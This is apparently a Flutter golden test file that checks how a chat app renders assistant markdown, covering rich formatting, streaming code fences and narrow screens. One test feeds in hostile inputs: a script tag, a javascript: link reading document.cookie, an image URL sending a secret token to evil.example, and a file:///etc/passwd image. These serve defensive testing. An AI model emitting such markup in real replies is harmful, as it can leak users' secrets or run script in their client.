// Visual checks of chat markdown. Regenerate with
//   flutter test test/chat --update-goldens
// then LOOK at test/goldens/md_*.png.
import 'package:flutter/material.dart';
import 'package:flutter_test/flutter_test.dart';
import 'package:pai_mobile/models/chat.dart';
import 'package:pai_mobile/ui/chat/chat_screen.dart';
import 'package:pai_mobile/ui/widgets/hud/hud.dart';

import '../ui/golden_harness.dart';

ChatMessage _assistant(String content) =>
    ChatMessage(id: 'a', role: 'assistant', content: content, createdAt: DateTime(2026, 11, 23, 12));

Future<void> _show(WidgetTester t, String content, {bool streaming = false, Size size = const Size(360, 860)}) async {
  await pumpHud(
    t,
    Scaffold(
      body: Padding(
        padding: const EdgeInsets.all(12),
        child: SingleChildScrollView(child: ChatMessageBubble(message: _assistant(content), streaming: streaming)),
      ),
    ),
    size: size,
  );
}

void main() {
  setUpAll(loadPaiFonts);
  setUp(() => HudBackground.debugFlat = true);
  tearDown(() => HudBackground.debugFlat = false);

  testWidgets('rich message: heading, list, task list, quote, table, code', (t) async {
    await _show(t, '''
## Weekly plan

Here is what I'll do, with **bold** emphasis, *italic*, ~~old~~ and `inline_code()`:

1. Capture the photo
2. Save it to **Pictures**
   - then notify you
   - and [open the gallery](https://example.com/gallery)

- [x] camera ready
- [ ] upload

> Tip: say "try again" if it fails.

| Device | Status |
|---|---|
| pixel-8 | online |
| desk-linux | offline |

```python
def greet(name):
    return f"hello {name}"
```
''');
    await expectLater(find.byType(MaterialApp), matchesGoldenFile('../goldens/md_rich.png'));
  });

  testWidgets('streaming: partial code fence, cursor visible', (t) async {
    await _show(t, 'Sure, here is the script:\n\n```bash\nfor f in *.jpg; do\n  echo "resizing \$f',
        streaming: true, size: const Size(360, 340));
    await expectLater(find.byType(MaterialApp), matchesGoldenFile('../goldens/md_streaming_fence.png'));
  });

  testWidgets('hostile content: html, javascript link, tracking image, file image', (t) async {
    await _show(t, '''
<script>alert('xss')</script>

[Click for a prize](javascript:alert(document.cookie)) and [a safe link](https://example.com)

![chart](https://evil.example/pixel.png?q=my-secret-token)

![local](file:///etc/passwd)
''', size: const Size(360, 420));
    await expectLater(find.byType(MaterialApp), matchesGoldenFile('../goldens/md_hostile.png'));
  });

  testWidgets('narrow screen at 1.3x text: wide table and long code line', (t) async {
    await pumpHud(
      t,
      Scaffold(
        body: Padding(
          padding: const EdgeInsets.all(12),
          child: SingleChildScrollView(
            child: ChatMessageBubble(
              message: _assistant('| Column A | Column B | Column C | Column D |\n|---|---|---|---|\n| value a | value b | value c | value d |\n\n```dart\nfinal veryLongVariableName = someFunction(argumentNumberOne, argumentNumberTwo);\n```'),
              streaming: false,
            ),
          ),
        ),
      ),
      size: const Size(320, 420),
      textScale: 1.3,
    );
    await expectLater(find.byType(MaterialApp), matchesGoldenFile('../goldens/md_narrow_scaled.png'));
  });
}
